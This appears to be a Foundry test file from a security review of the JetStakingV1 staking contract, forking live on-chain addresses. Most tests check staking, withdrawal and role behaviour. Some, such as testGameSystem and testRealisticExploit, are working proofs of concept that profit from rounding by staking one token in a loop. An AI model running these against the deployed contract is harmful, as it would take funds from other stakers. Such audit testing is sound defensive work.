// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import ".../contracts/JetStakingV1.sol";
import "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";

import "forge-std/Test.sol";

contract onChainTest is Test {
    // Contract addresses
    JetStakingV1 jetStaking = JetStakingV1(0xccc2b1aD21666A5847A804a73a41F904C4a4A0Ec);
    JetStakingV1 implementation = JetStakingV1(0x852F139Dd31D2cdc669470880700037Cb3790934);
    // Roles
    address airdropRole = address(0x88e21E0CeE6FbdAa1E7BBd2f7e25554144CDCE42); 
    address claimRole = address(0x88e21E0CeE6FbdAa1E7BBd2f7e25554144CDCE42);
    address pauseRole = address(0x88e21E0CeE6FbdAa1E7BBd2f7e25554144CDCE42);
    address streamManagerRole = address(0x61c8f8f192C345424a0836d722892231CE7a47b8);
    address defaultAdminRole = address(0x88e21E0CeE6FbdAa1E7BBd2f7e25554144CDCE42);
    // Aurora token
    IERC20 aurora = IERC20(0x8BEc47865aDe3B172A928df8f990Bc7f2A3b9f79);
    // Reward tokens
    address[] rewardTokens;
    // Accounts
    address user1 = address(1);
    address user2 = address(2);
    address user3 = address(3);
    address user4 = address(4);

    function setUp() public {
        deal(address(aurora), address(this), 10000 ether);
        uint256 length = jetStaking.getStreamsCount();
        for(uint256 i; i < length; ++i) {
            (,address token,,,,,,,,,) = jetStaking.getStream(i);
            rewardTokens.push(token);
        }
    } 

    /* ===================================
            SIMPLE FUNCTIONALITY
    ==================================== */

    function testStakeAndWithdraw() public {
        aurora.approve(address(jetStaking), 1000 ether);
        jetStaking.stake(1000 ether);
        console.log(jetStaking.getUserShares(address(this)));
        console.log(jetStaking.getUserTotalDeposit(address(this)));
        vm.warp(block.timestamp + 1 weeks);
        jetStaking.moveAllRewardsToPending();
        jetStaking.unstakeAll();
        vm.warp(block.timestamp + 20 days);
        jetStaking.withdrawAll();
        logUserBalances(address(this));
    }

    function testStakeAndBatchWithdraw() public {
        aurora.approve(address(jetStaking), 1000 ether);
        jetStaking.stake(1000 ether);
        console.log(jetStaking.getUserShares(address(this)));
        console.log(jetStaking.getUserTotalDeposit(address(this)));
        vm.warp(block.timestamp + 1 weeks);
        jetStaking.moveAllRewardsToPending();
        jetStaking.unstakeAll();
        vm.warp(block.timestamp + 20 days);
        uint256[] memory streamId = new uint256[](2);
        streamId[0] = 0;
        streamId[1] = 1;
        jetStaking.batchWithdraw(streamId);
        logUserBalances(address(this)); // Should only have balances for stream 0 & 1
    }

    function testStakeTwice() public {
        aurora.approve(address(jetStaking), 20**21);
        jetStaking.stake(10**21);
        vm.warp(block.timestamp + 1 weeks);
        jetStaking.stake(10**21);
        jetStaking.moveAllRewardsToPending();
        jetStaking.unstakeAll();
        vm.warp(block.timestamp + 20 days);
        jetStaking.withdrawAll();
        logUserBalances(address(this)); // User loses all rewards when staking / unstaking
    }

    function testCannotInitializeImplementation() public {
        uint256[] memory scheduleTimes = new uint256[](1);
        scheduleTimes[0] = 1;
        uint256[] memory scheduleRewards = new uint256[](1);
        scheduleRewards[0] = 1;
        vm.expectRevert("Initializable: contract is already initialized");
        implementation.initialize(
            address(aurora), 
            address(this), 
            scheduleTimes, 
            scheduleRewards, 
            5, 
            0, 
            address(this), 
            100, 
            50
            );
    }

    /* ===================================
                EDGE CASES
    ==================================== */

    function testStake1Aurora() public {
        uint256 sharesPrice = jetStaking.getTotalAmountOfStakedAurora() * 1000 / jetStaking.totalAuroraShares();
        emit log_named_uint("Aurora per share (divide by 1000)", sharesPrice);
        deal(address(aurora), user3, 1);
        vm.startPrank(user3);
        aurora.approve(address(jetStaking), 1);
        jetStaking.stake(1);
        emit log_named_uint("Shares received", jetStaking.getUserShares(user3));
        jetStaking.unstakeAll();
        vm.warp(block.timestamp + 2 days + 1);
        jetStaking.withdrawAll();
        emit log_named_uint("Aurora received from 1 aurora", aurora.balanceOf(user3));
    }

    function testGameSystem() public {
        uint256 balanceBefore = aurora.balanceOf(user1);
        deal(address(aurora), user1, 10000);
        vm.startPrank(user1);
        aurora.approve(address(jetStaking), 10000);
        for(uint256 i; i < 10000; i++) {
            jetStaking.stake(1);
        }
        jetStaking.unstakeAll();
        vm.warp(block.timestamp + 2 days + 1);
        jetStaking.withdrawAll();
        uint256 balanceAfter = aurora.balanceOf(user1);
        emit log_named_uint("Aurora profit = ", balanceAfter - balanceBefore);
    }

    function testRealisticExploit() public {
        uint256 balanceBefore = aurora.balanceOf(user1);
        deal(address(aurora), user1, 500);
        vm.startPrank(user1);
        aurora.approve(address(jetStaking), 500);
        for(uint256 i; i < 500; i++) {
            jetStaking.stake(1);
        }
        jetStaking.unstakeAll();
        vm.warp(block.timestamp + 2 days + 1);
        jetStaking.withdrawAll();
        uint256 balanceAfter = aurora.balanceOf(user1);
        emit log_named_uint("Aurora profit = ", balanceAfter - balanceBefore);
    }

    function testWithdrawalOrder() public {
        stakeFor(user1, 10 ether);
        stakeFor(user2, 10 ether);
        vm.warp(block.timestamp + 10 weeks);
        vm.startPrank(user1);
        jetStaking.moveAllRewardsToPending();
        jetStaking.unstakeAll();
        vm.stopPrank();
        vm.startPrank(user2);
        jetStaking.moveAllRewardsToPending();
        jetStaking.unstakeAll();
        vm.stopPrank();
        vm.warp(block.timestamp + 2 days + 1);
        vm.prank(user1);
        jetStaking.withdrawAll();
        vm.prank(user2);
        jetStaking.withdrawAll();
        logUserBalances(user1);
        logUserBalances(user2);
    }

    function testWhaleSniper() public { 
        stakeFor(user2, 10 ether);
        vm.warp(block.timestamp + 10 weeks);
        stakeFor(user3, 10**30); // No matter how much is staked rewards arent diluted
        vm.startPrank(user2);
        jetStaking.moveAllRewardsToPending();
        jetStaking.unstakeAll();
        vm.warp(block.timestamp + 2 days + 1);
        jetStaking.withdrawAll();
        logUserBalances(user2); 
    }

    function testTimeTravel() public {
        stakeFor(user1, 10 ether);
        vm.warp(block.timestamp - 1 weeks);
        vm.startPrank(user1);
        vm.expectRevert("INVALID_LAST_UPDATE");
        jetStaking.moveAllRewardsToPending();
    }


    /* ===================================
             JetStaking view
    ==================================== */

    function testProbeContractStatus() public {
        emit log("General info");
        emit log_named_uint("Stream count", jetStaking.getStreamsCount());
        for(uint256 i; i < rewardTokens.length; i++) {
            emit log_named_uint("Stream", i);
            emit log_named_uint("Treasury balance", jetStaking.getTreasuryBalance(rewardTokens[i]) / 1 ether);
            if(i > 0) {
                emit log_named_uint("Stream ownerClaimable amount", jetStaking.getStreamOwnerClaimableAmount(i) / 1 ether);
                emit log_named_uint("Rewards per share (RPS)", jetStaking.getRewardPerShare(i) / 1 ether);
                emit log_named_uint("Latest reward per share (RPS)", jetStaking.getLatestRewardPerShare(i) / 1 ether);
            }  
            emit log_named_uint("Reward amount", jetStaking.getRewardsAmount(i, block.timestamp - 1) / 1 ether);
        }

    }

    /* ===================================
             JetStaking Roles
    ==================================== */
    
    function testAirdropRole() public {
        address[] memory accounts = new address[](2);
        accounts[0] = user1;
        accounts[1] = user2;
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 10 ether;
        amounts[1] = 10 ether;
        uint256 batchAmount = 20 ether;
        deal(address(aurora), airdropRole, batchAmount);
        vm.startPrank(airdropRole);
        aurora.approve(address(jetStaking), batchAmount);
        jetStaking.stakeOnBehalfOfOtherUsers(accounts, amounts, batchAmount);
        assert(jetStaking.getUserTotalDeposit(user1) + jetStaking.getUserTotalDeposit(user2) == 20 ether);
    }

    function testStreamManagerRole() public {
        vm.startPrank(streamManagerRole);
        address newToken = address(8);
        uint256[] memory scheduleTimes = new uint256[](2);
        scheduleTimes[0] = block.timestamp + 1000;
        scheduleTimes[1] = block.timestamp + 2000;
        uint256[] memory scheduleRewards = new uint256[](2);
        scheduleRewards[0] = 1000;
        scheduleRewards[1] = 0;
         // Would recommend support for the token to be added "on demand"
        vm.expectRevert("INVALID_SUPPORTED_TOKEN_ADDRESS"); 
        jetStaking.proposeStream(
            user1, 
            newToken, 
            100, 
            1000, 
            100, 
            scheduleTimes, 
            scheduleRewards, 
            1 days
            );
    }

    function testClaimRole() public {
        stakeFor(user1, 10 ether);
        vm.warp(block.timestamp + 1 weeks);
        vm.startPrank(claimRole);
        jetStaking.claimAllOnBehalfOfAnotherUser(user1);
    }

    function testUpdateTreasury() public {
        vm.startPrank(defaultAdminRole);
        jetStaking.adminPause(1);
        jetStaking.updateTreasury(address(10));
    }

    /* ===================================
                    HELPER
    ==================================== */

    function logUserBalances(address user) public {
        emit log_named_address("Balances for", user);
        uint256 length = rewardTokens.length;
        for(uint256 i; i < length; ++i) {
            emit log_named_uint("Stream balance: ", IERC20(rewardTokens[i]).balanceOf(user));
        }
    } 

    function stakeFor(address account, uint256 amount) public {
        deal(address(aurora), account, amount);
        vm.startPrank(account);
        aurora.approve(address(jetStaking), amount);
        jetStaking.stake(amount);
        vm.stopPrank();
    }

      
}
